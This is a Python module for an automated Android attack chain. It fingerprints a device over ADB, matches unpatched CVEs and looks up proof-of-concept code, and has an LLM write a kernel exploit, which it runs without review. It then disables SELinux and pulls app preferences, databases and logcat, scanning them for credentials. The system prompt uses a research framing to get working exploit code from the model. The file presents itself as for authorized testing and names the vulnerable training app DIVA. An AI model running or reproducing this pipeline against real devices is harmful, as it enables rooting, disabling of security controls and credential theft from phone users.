"""
Full Attack Chain - End-to-End 1-Day Exploitation

Implements the research paper methodology:
1. Reconnaissance â†’ Device fingerprinting, CVE matching
2. Exploitation â†’ Kernel CVE to achieve root
3. Privilege Escalation â†’ SELinux bypass, persistence
4. Post-Exploitation â†’ Access protected app data

For authorized security testing only.
"""

import json
import logging
import re
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Callable, Optional

from core.constants import CRED_REGEXES, USER_REGEXES
from core.reconnaissance.device_enum import ADBConnection
from core.utils import format_timestamp, get_utc_now

logger = logging.getLogger(__name__)


class ChainPhase(Enum):
    """Attack chain phases per research paper."""
    RECONNAISSANCE = "reconnaissance"
    CVE_MATCHING = "cve_matching"
    EXPLOITATION = "exploitation"
    USERLAND_EXPLOIT = "userland_exploit"  # Application-level attacks
    PRIVILEGE_ESCALATION = "privilege_escalation"
    POST_EXPLOITATION = "post_exploitation"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class PhaseResult:
    """Result of a single phase."""
    phase: ChainPhase
    success: bool
    output: str
    artifacts: dict = field(default_factory=dict)
    duration_seconds: float = 0.0
    error: Optional[str] = None


@dataclass
class ChainResult:
    """Full attack chain result."""
    target_device: str
    objective: str
    phases: list
    final_success: bool
    root_achieved: bool
    selinux_bypassed: bool
    data_extracted: dict
    total_duration: float
    timestamp: datetime = field(default_factory=get_utc_now)


class AttackChain:
    """
    Full attack chain implementing research paper methodology.

    Usage:
        chain = AttackChain(device_id="127.0.0.1:6562")
        result = chain.execute(
            objective="Extract credentials from DIVA app",
            target_package="jakhar.aseem.diva"
        )
    """

    def __init__(
        self,
        device_id: str,
        llm_client=None,
        max_retries: int = 3,
        output_dir: str = "output/attack_chains",
    ):
        self.device_id = device_id
        self.adb_conn = ADBConnection(device_id)
        self.max_retries = max_retries
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # LLM client
        if llm_client is None:
            from agent import LLMClient
            self.llm_client = LLMClient.create()
        else:
            self.llm_client = llm_client

        # State tracking
        self.current_phase = ChainPhase.RECONNAISSANCE
        self.is_rooted = False
        self.selinux_disabled = False
        self.device_info = {}
        self.matched_cves = []

    def execute(
        self,
        objective: str,
        target_package: Optional[str] = None,
        progress_callback: Optional[Callable] = None,
    ) -> ChainResult:
        """
        Execute full attack chain.

        Args:
            objective: What to achieve (e.g., "Extract DIVA credentials")
            target_package: Target app package name
            progress_callback: Optional callback for progress updates
        """
        start_time = time.time()
        phases = []
        data_extracted = {}

        def report_progress(phase: ChainPhase, message: str):
            if progress_callback:
                progress_callback(phase, message)
            logger.info(f"[{phase.value}] {message}")

        try:
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHASE 1: RECONNAISSANCE
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            report_progress(ChainPhase.RECONNAISSANCE, "Starting device reconnaissance...")
            phase1 = self._phase_reconnaissance()
            phases.append(phase1)

            if not phase1.success:
                raise Exception(f"Reconnaissance failed: {phase1.error}")

            report_progress(ChainPhase.RECONNAISSANCE,
                f"Device: {self.device_info.get('model')} Android {self.device_info.get('android_version')}")

            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHASE 2: CVE MATCHING
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            report_progress(ChainPhase.CVE_MATCHING, "Matching CVEs against device profile...")
            phase2 = self._phase_cve_matching()
            phases.append(phase2)

            if not phase2.success or not self.matched_cves:
                raise Exception("No exploitable CVEs found for this device")

            report_progress(ChainPhase.CVE_MATCHING,
                f"Found {len(self.matched_cves)} applicable CVEs")

            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHASE 3: EXPLOITATION (Root)
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            report_progress(ChainPhase.EXPLOITATION, "Attempting kernel exploitation for root...")
            phase3 = self._phase_exploitation()
            phases.append(phase3)

            if phase3.success:
                self.is_rooted = True
                report_progress(ChainPhase.EXPLOITATION, "ROOT ACHIEVED!")
            else:
                report_progress(ChainPhase.EXPLOITATION,
                    "Exploitation failed, trying alternative methods...")
                # Try alternative exploitation
                phase3b = self._phase_exploitation_alternative()
                phases.append(phase3b)
                if phase3b.success:
                    self.is_rooted = True

            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHASE 3.5: USERLAND EXPLOITATION (No root required)
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            if not self.is_rooted and target_package:
                report_progress(ChainPhase.USERLAND_EXPLOIT,
                    f"Attempting userland exploitation of {target_package}...")
                phase3c = self._phase_userland_exploitation(target_package, objective)
                phases.append(phase3c)

                if phase3c.success:
                    # Userland exploit succeeded - we can extract data without root
                    data_extracted = phase3c.artifacts
                    report_progress(ChainPhase.USERLAND_EXPLOIT,
                        f"Userland exploitation successful! Extracted {len(data_extracted)} items")

            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHASE 4: PRIVILEGE ESCALATION (SELinux Bypass)
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            if self.is_rooted:
                report_progress(ChainPhase.PRIVILEGE_ESCALATION, "Bypassing SELinux...")
                phase4 = self._phase_selinux_bypass()
                phases.append(phase4)

                if phase4.success:
                    self.selinux_disabled = True
                    report_progress(ChainPhase.PRIVILEGE_ESCALATION, "SELinux BYPASSED!")

            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHASE 5: POST-EXPLOITATION
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            if self.is_rooted and target_package:
                report_progress(ChainPhase.POST_EXPLOITATION,
                    f"Extracting data from {target_package}...")
                phase5 = self._phase_post_exploitation(target_package, objective)
                phases.append(phase5)

                if phase5.success:
                    data_extracted = phase5.artifacts
                    report_progress(ChainPhase.POST_EXPLOITATION,
                        f"Extracted {len(data_extracted)} data items!")

            self.current_phase = ChainPhase.COMPLETED

        except Exception as e:
            logger.error(f"Attack chain failed: {e}")
            self.current_phase = ChainPhase.FAILED
            phases.append(PhaseResult(
                phase=ChainPhase.FAILED,
                success=False,
                output="",
                error=str(e)
            ))

        # Build result
        total_duration = time.time() - start_time
        result = ChainResult(
            target_device=self.device_id,
            objective=objective,
            phases=phases,
            final_success=self.current_phase == ChainPhase.COMPLETED,
            root_achieved=self.is_rooted,
            selinux_bypassed=self.selinux_disabled,
            data_extracted=data_extracted,
            total_duration=total_duration,
        )

        # Save result
        self._save_result(result)

        return result

    def _adb(self, cmd: str, timeout: int = 30) -> tuple:
        """Execute ADB command using centralized ADBConnection."""
        stdout = self.adb_conn.shell(cmd, timeout=timeout)
        # For compatibility with existing return signature (success, output)
        # In a future pass, we will update the callers to use ADBConnection directly
        return True, stdout

    def _phase_reconnaissance(self) -> PhaseResult:
        """Phase 1: Device fingerprinting."""
        start = time.time()
        artifacts = {}

        try:
            # Get device properties
            props = [
                ("android_version", "getprop ro.build.version.release"),
                ("api_level", "getprop ro.build.version.sdk"),
                ("security_patch", "getprop ro.build.version.security_patch"),
                ("kernel", "uname -r"),
                ("model", "getprop ro.product.model"),
                ("manufacturer", "getprop ro.product.manufacturer"),
                ("hardware", "getprop ro.hardware"),
                ("selinux", "getenforce"),
            ]

            for key, cmd in props:
                success, output = self._adb(cmd)
                if success:
                    self.device_info[key] = output
                    artifacts[key] = output

            # Check current root status
            success, output = self._adb("id")
            artifacts["current_uid"] = output
            self.is_rooted = "uid=0" in output

            # Check installed packages
            success, output = self._adb("pm list packages -3")
            artifacts["third_party_apps"] = output.split('\n') if success else []

            return PhaseResult(
                phase=ChainPhase.RECONNAISSANCE,
                success=True,
                output=json.dumps(self.device_info, indent=2),
                artifacts=artifacts,
                duration_seconds=time.time() - start
            )

        except Exception as e:
            return PhaseResult(
                phase=ChainPhase.RECONNAISSANCE,
                success=False,
                output="",
                error=str(e),
                duration_seconds=time.time() - start
            )

    def _phase_cve_matching(self) -> PhaseResult:
        """Phase 2: Match CVEs against device profile using LIVE NVD API."""
        start = time.time()

        try:
            from core.exploits.nvd_live_matcher import NVDLiveMatcher, PoCFetcher

            logger.info("Querying live NVD API for unpatched CVEs...")

            matcher = NVDLiveMatcher()
            poc_fetcher = PoCFetcher()

            # Find CVEs published AFTER the device's patch date
            android_cves = matcher.find_unpatched_cves(
                android_version=self.device_info.get("android_version", ""),
                security_patch=self.device_info.get("security_patch", ""),
                min_cvss=7.0,
                max_results=30
            )

            # Also search for kernel-specific CVEs
            kernel_version = self.device_info.get("kernel", "")
            if kernel_version:
                kernel_cves = matcher.find_kernel_exploits(kernel_version)
                # Add unique kernel CVEs
                for cve in kernel_cves:
                    if not any(c.cve_id == cve.cve_id for c in android_cves):
                        android_cves.append(cve)

            # Convert to our format and search for PoCs
            self.matched_cves = []
            for cve in android_cves:
                # Check for existing PoC references
                has_poc = cve.exploit_maturity == "POC"

                # Search GitHub for additional PoCs
                if not has_poc:
                    pocs = poc_fetcher.find_poc(cve.cve_id)
                    has_poc = len(pocs) > 0

                self.matched_cves.append({
                    "cve_id": cve.cve_id,
                    "cvss": cve.cvss_score,
                    "severity": cve.severity,
                    "description": cve.description[:150],
                    "attack_vector": cve.attack_vector,
                    "has_exploit": has_poc,
                    "published": cve.published[:10],
                    "references": [r["url"] for r in cve.references if r.get("is_exploit")][:3],
                    "cwe_ids": cve.cwe_ids,
                })

            # Prioritize: PoC available > Local attack vector > CVSS score
            self.matched_cves.sort(
                key=lambda x: (
                    x["has_exploit"],
                    x["attack_vector"] == "LOCAL",
                    x["cvss"]
                ),
                reverse=True
            )

            # Log top CVEs
            logger.info(f"Found {len(self.matched_cves)} unpatched CVEs from NVD")
            for cve in self.matched_cves[:5]:
                poc_tag = "ðŸ”´ PoC" if cve["has_exploit"] else ""
                logger.info(f"  {cve['cve_id']}: CVSS {cve['cvss']} ({cve['severity']}) {poc_tag}")

            return PhaseResult(
                phase=ChainPhase.CVE_MATCHING,
                success=len(self.matched_cves) > 0,
                output=f"Found {len(self.matched_cves)} unpatched CVEs from live NVD API",
                artifacts={"cves": self.matched_cves[:10]},
                duration_seconds=time.time() - start
            )

        except Exception as e:
            logger.error(f"CVE matching failed: {e}")
            return PhaseResult(
                phase=ChainPhase.CVE_MATCHING,
                success=False,
                output="",
                error=str(e),
                duration_seconds=time.time() - start
            )

    def _phase_exploitation(self) -> PhaseResult:
        """Phase 3: Attempt kernel exploitation."""
        start = time.time()

        if self.is_rooted:
            return PhaseResult(
                phase=ChainPhase.EXPLOITATION,
                success=True,
                output="Device already rooted",
                duration_seconds=time.time() - start
            )

        # Select best CVE for exploitation
        if not self.matched_cves:
            return PhaseResult(
                phase=ChainPhase.EXPLOITATION,
                success=False,
                output="No CVEs to exploit",
                error="No matched CVEs",
                duration_seconds=time.time() - start
            )

        target_cve = self.matched_cves[0]

        # Generate exploit using LLM
        prompt = f"""Generate a kernel exploit script for {target_cve['cve_id']} on Android.

Target Device:
- Android: {self.device_info.get('android_version')}
- Kernel: {self.device_info.get('kernel')}
- ADB ID: {self.device_id}
- SELinux: {self.device_info.get('selinux')}

CVE: {target_cve['cve_id']}
Description: {target_cve['description']}

Requirements:
1. Use subprocess to run ADB commands
2. Target: {self.device_id}
3. Goal: Achieve uid=0 (root)
4. Print "[ROOT_SUCCESS]" if root achieved
5. Print "[ROOT_FAILED]" if failed

Output ONLY executable Python code."""

        try:
            response = self.llm_client.complete(
                prompt,
                system="You are an Android kernel security researcher. Generate working exploit code for authorized testing."
            )

            code = self._extract_code(response.content)

            # Execute exploit
            exploit_path = self.output_dir / "current_exploit.py"
            exploit_path.write_text(code)

            result = subprocess.run(
                ["python3", str(exploit_path)],
                capture_output=True, text=True, timeout=120,
                env={**__import__("os").environ, "DEVICE_ID": self.device_id}
            )

            output = result.stdout + result.stderr

            # Check for root
            success, id_output = self._adb("id")
            root_achieved = "uid=0" in id_output or "[ROOT_SUCCESS]" in output

            if root_achieved:
                self.is_rooted = True

            return PhaseResult(
                phase=ChainPhase.EXPLOITATION,
                success=root_achieved,
                output=output[:1000],
                artifacts={"exploit_code": code[:500], "cve": target_cve["cve_id"]},
                duration_seconds=time.time() - start
            )

        except Exception as e:
            return PhaseResult(
                phase=ChainPhase.EXPLOITATION,
                success=False,
                output="",
                error=str(e),
                duration_seconds=time.time() - start
            )

    def _phase_exploitation_alternative(self) -> PhaseResult:
        """Try alternative exploitation methods."""
        start = time.time()

        # Try known working methods for common scenarios
        methods = [
            # Try Magisk if available
            ("magisk", "su -c 'id'"),
            # Try common su binaries
            ("su_binary", "/system/xbin/su -c 'id'"),
            # Try ADB root
            ("adb_root", None),  # Special handling
        ]

        for method_name, cmd in methods:
            if method_name == "adb_root":
                # Try adb root command
                try:
                    subprocess.run(
                        ["adb", "-s", self.device_id, "root"],
                        capture_output=True, text=True, timeout=10
                    )
                    time.sleep(2)
                    # Reconnect
                    subprocess.run(
                        ["adb", "-s", self.device_id, "wait-for-device"],
                        timeout=10
                    )
                    success, output = self._adb("id")
                    if "uid=0" in output:
                        return PhaseResult(
                            phase=ChainPhase.EXPLOITATION,
                            success=True,
                            output=f"Root via adb root: {output}",
                            artifacts={"method": "adb_root"},
                            duration_seconds=time.time() - start
                        )
                except Exception:
                    pass
            else:
                success, output = self._adb(cmd)
                if success and "uid=0" in output:
                    return PhaseResult(
                        phase=ChainPhase.EXPLOITATION,
                        success=True,
                        output=f"Root via {method_name}: {output}",
                        artifacts={"method": method_name},
                        duration_seconds=time.time() - start
                    )

        return PhaseResult(
            phase=ChainPhase.EXPLOITATION,
            success=False,
            output="All alternative methods failed",
            duration_seconds=time.time() - start
        )

    def _phase_selinux_bypass(self) -> PhaseResult:
        """Phase 4: Bypass SELinux."""
        start = time.time()

        if not self.is_rooted:
            return PhaseResult(
                phase=ChainPhase.PRIVILEGE_ESCALATION,
                success=False,
                output="Cannot bypass SELinux without root",
                error="Root required",
                duration_seconds=time.time() - start
            )

        # Check current SELinux status
        success, status = self._adb("getenforce")

        if "Permissive" in status or "Disabled" in status:
            self.selinux_disabled = True
            return PhaseResult(
                phase=ChainPhase.PRIVILEGE_ESCALATION,
                success=True,
                output=f"SELinux already permissive: {status}",
                duration_seconds=time.time() - start
            )

        # Try to disable SELinux
        methods = [
            "su -c 'setenforce 0'",
            "su -c 'echo 0 > /sys/fs/selinux/enforce'",
        ]

        for cmd in methods:
            self._adb(cmd)
            success, new_status = self._adb("getenforce")
            if "Permissive" in new_status:
                self.selinux_disabled = True
                return PhaseResult(
                    phase=ChainPhase.PRIVILEGE_ESCALATION,
                    success=True,
                    output=f"SELinux bypassed: {new_status}",
                    artifacts={"method": cmd},
                    duration_seconds=time.time() - start
                )

        return PhaseResult(
            phase=ChainPhase.PRIVILEGE_ESCALATION,
            success=False,
            output=f"Could not bypass SELinux: {status}",
            duration_seconds=time.time() - start
        )

    def _phase_post_exploitation(self, target_package: str, objective: str) -> PhaseResult:
        """Phase 5: Extract data from target application."""
        start = time.time()
        extracted_data = {}

        if not self.is_rooted:
            return PhaseResult(
                phase=ChainPhase.POST_EXPLOITATION,
                success=False,
                output="Root required for data extraction",
                error="Not rooted",
                duration_seconds=time.time() - start
            )

        # Data extraction paths
        data_paths = [
            f"/data/data/{target_package}/shared_prefs/",
            f"/data/data/{target_package}/databases/",
            f"/data/data/{target_package}/files/",
        ]

        for path in data_paths:
            # List files
            success, files = self._adb(f"su -c 'ls -la {path}' 2>/dev/null")
            if success and files:
                extracted_data[path] = {"listing": files}

                # Try to read specific files
                if "shared_prefs" in path:
                    # Read XML preferences
                    success, content = self._adb(
                        f"su -c 'cat {path}*.xml' 2>/dev/null"
                    )
                    if success:
                        extracted_data[path]["content"] = content[:2000]

                        # Look for credentials
                        for regex in CRED_REGEXES:
                            creds = regex.findall(content)
                            if creds:
                                if "credentials_found" not in extracted_data:
                                    extracted_data["credentials_found"] = []
                                extracted_data["credentials_found"].extend(creds)

                elif "databases" in path:
                    # List database contents
                    success, tables = self._adb(
                        f"su -c 'sqlite3 {path}*.db \".tables\"' 2>/dev/null"
                    )
                    if success:
                        extracted_data[path]["tables"] = tables

        # Read logcat for leaked data
        success, logcat = self._adb(
            f"logcat -d | grep -i '{target_package}' | tail -50"
        )
        if success:
            extracted_data["logcat"] = logcat

            # Look for credentials in logs
            for regex in CRED_REGEXES + USER_REGEXES:
                log_creds = regex.findall(logcat)
                if log_creds:
                    if "logcat_credentials" not in extracted_data:
                        extracted_data["logcat_credentials"] = []
                    extracted_data["logcat_credentials"].extend(log_creds)

        return PhaseResult(
            phase=ChainPhase.POST_EXPLOITATION,
            success=len(extracted_data) > 0,
            output=f"Extracted data from {len(extracted_data)} sources",
            artifacts=extracted_data,
            duration_seconds=time.time() - start
        )

    def _extract_code(self, response: str) -> str:
        """Extract Python code from LLM response."""
        if "```python" in response:
            match = re.search(r"```python\n(.*?)```", response, re.DOTALL)
            if match:
                return match.group(1).strip()
        elif "```" in response:
            match = re.search(r"```\n?(.*?)```", response, re.DOTALL)
            if match:
                return match.group(1).strip()
        return response.strip()

    def _save_result(self, result: ChainResult):
        """Save attack chain result."""
        ts = format_timestamp(result.timestamp)
        path = self.output_dir / f"chain_{ts}.json"

        data = {
            "target": result.target_device,
            "objective": result.objective,
            "success": result.final_success,
            "root_achieved": result.root_achieved,
            "selinux_bypassed": result.selinux_bypassed,
            "phases": [
                {
                    "phase": p.phase.value,
                    "success": p.success,
                    "duration": p.duration_seconds,
                    "error": p.error,
                }
                for p in result.phases
            ],
            "data_extracted": bool(result.data_extracted),
            "total_duration": result.total_duration,
            "timestamp": result.timestamp.isoformat(),
        }

        path.write_text(json.dumps(data, indent=2))
        logger.info(f"Chain result saved: {path}")


def run_attack_chain(
    device_id: str,
    objective: str,
    target_package: Optional[str] = None,
) -> ChainResult:
    """Quick function to run full attack chain."""
    chain = AttackChain(device_id=device_id)
    return chain.execute(objective=objective, target_package=target_package)
